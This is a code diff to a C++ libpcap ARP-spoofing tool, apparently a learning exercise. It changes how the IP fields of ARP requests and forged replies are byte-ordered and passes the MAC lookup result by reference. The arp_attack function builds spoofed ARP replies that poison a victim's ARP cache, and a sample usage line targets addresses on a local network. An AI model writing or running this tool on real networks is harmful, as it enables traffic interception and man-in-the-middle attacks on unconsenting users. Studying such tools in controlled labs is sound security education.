@@ -6,7 +6,7 @@ void usage() {
 	printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-bool request_and_get_mac(pcap_t* pcap, Mac myMac, Ip myIp, Ip receiverIp, Mac receiverMac) {
+bool request_and_get_mac(pcap_t* pcap, Mac myMac, Ip myIp, Ip receiverIp, Mac& receiverMac) {
     EthArpPacket packet;
 
     packet.ethHdr_.dmac_ = receiverMac;
@@ -19,9 +19,9 @@ bool request_and_get_mac(pcap_t* pcap, Mac myMac, Ip myIp, Ip receiverIp, Mac re
     packet.arpHdr_.plen_ = Ip::SIZE;
     packet.arpHdr_.op_ = htons(ArpHdr::REQUEST);
     packet.arpHdr_.smac_ = myMac;
-    packet.arpHdr_.sip_ = htonl(static_cast<uint32_t>(receiverIp));
+    packet.arpHdr_.sip_ = static_cast<uint32_t>(receiverIp);
     packet.arpHdr_.tmac_ = receiverMac;
-    packet.arpHdr_.tip_ = htonl(static_cast<uint32_t>(receiverIp)); 
+    packet.arpHdr_.tip_ = static_cast<uint32_t>(receiverIp); 
 
 
     int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
@@ -68,9 +68,9 @@ void arp_attack(pcap_t* handle, const Mac& sender_mac, const Ip& sender_ip, cons
     packet.arpHdr_.plen_ = Ip::SIZE;
     packet.arpHdr_.op_ = htons(ArpHdr::REPLY);
     packet.arpHdr_.smac_ = my_mac;
-    packet.arpHdr_.sip_ = htonl(static_cast<uint32_t>(target_ip));
+    packet.arpHdr_.sip_ = static_cast<uint32_t>(target_ip);
     packet.arpHdr_.tmac_ = sender_mac;
-    packet.arpHdr_.tip_ = htonl(static_cast<uint32_t>(sender_ip)); 
+    packet.arpHdr_.tip_ = static_cast<uint32_t>(sender_ip); 
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
